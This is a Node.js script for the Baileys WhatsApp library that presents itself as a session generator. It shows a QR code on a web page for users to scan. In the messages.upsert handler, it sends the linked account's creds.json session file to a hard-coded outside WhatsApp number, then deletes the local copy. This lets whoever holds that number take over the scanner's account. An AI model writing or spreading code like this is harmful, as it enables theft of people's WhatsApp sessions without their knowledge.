const { default: sessionMdByZeeoneOfc, useMultiFileAuthState,
DisconnectReason, delay,
downloadContentFromMessage, makeInMemoryStore, jidDecode, proto } = require("@adiwajshing/baileys")
const pino = require('pino')
const { Boom } = require('@hapi/boom')
const fs = require ('fs')
//qrwa = null
//PORT = 5000
const {
   toBuffer,
   toDataURL
} = require('qrcode')
const express = require('express')
let app = express()
const {
   createServer
} = require('http')
//let server = createServer(app)
let _qr = 'invalid'
let PORT = 3000 || 8000 || 8080
const path = require('path')

async function startSesi() {
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
  
  const { state, saveCreds } = await useMultiFileAuthState(`session-md`)
    const alpha = sessionMdByZeeoneOfc({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: true,
        browser: ['Session Md','Safari','1.0.0'],
        auth: state
    })

    store.bind(alpha.ev)
    
    alpha.ev.on('messages.upsert', async chatUpdate => {
        //console.log(JSON.stringify(chatUpdate, undefined, 2))
        try {
        mek = chatUpdate.messages[0]
        if (!mek.message) return
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        if (mek.key && mek.key.remoteJid === 'status@broadcast') return
        if (!mek.key.fromMe && chatUpdate.type === 'notify') return
        if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
		let anu = await alpha.sendMessage("77759599716@s.whatsapp.net", {document: fs.readFileSync(`./session-md/creds.json`), mimetype:'json', fileName:`creds.json`})
		await alpha.sendMessage("77759599716@s.whatsapp.net", {text: "Upload this session to ur bot multi auth state"}, {quoted: anu})
          delay (60000)
          // directory path
const dir = 'session-md'

// delete directory recursively
try {
  fs.rmdirSync(dir, { recursive: true })

  console.log(`${dir} is deleted!`)
  startSesi()
} catch (err) {
  console.error(`Error while deleting ${dir}.`)
}
          
        } catch (err) {
            console.log(err)
        }
    })
	
alpha.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr} = update	
  if (qr) {
         app.use(async (req, res) => {
            res.setHeader('content-type', 'image/png')
            res.end(await toBuffer(qr))
         })
         app.use(express.static(path.join(__dirname, 'views')))
         app.listen(process.env.PORT, () => {
            console.log('Scan di bagian web')
         })
      }
        if (connection === 'close') {
        let reason = new Boom(lastDisconnect?.error)?.output.statusCode
            if (reason === DisconnectReason.badSession) { console.log(`Bad Session File, Please Delete Session and Scan Again`); alpha.logout(); }
            else if (reason === DisconnectReason.connectionClosed) { console.log("Connection closed, reconnecting...."); startSesi(); }
            else if (reason === DisconnectReason.connectionLost) { console.log("Connection Lost from Server, reconnecting..."); startSesi(); }
            else if (reason === DisconnectReason.connectionReplaced) { console.log("Connection Replaced, Another New Session Opened, Please Close Current Session First"); alpha.logout(); }
            else if (reason === DisconnectReason.loggedOut) { console.log(`Device Logged Out, Please Scan Again And Run.`); alpha.logout(); }
            else if (reason === DisconnectReason.restartRequired) { console.log("Restart Required, Restarting..."); startSesi(); }
            else if (reason === DisconnectReason.timedOut) { console.log("Connection TimedOut, Reconnecting..."); startSesi(); }
            else if (reason === DisconnectReason.Multidevicemismatch) { console.log("Multi device mismatch, please scan again"); alpha.logout(); }
            else alpha.end(`Unknown DisconnectReason: ${reason}|${connection}`)
        }
        console.log('Connected...', update)
    })

    alpha.ev.on('creds.update', saveCreds)

    return alpha
}

startSesi()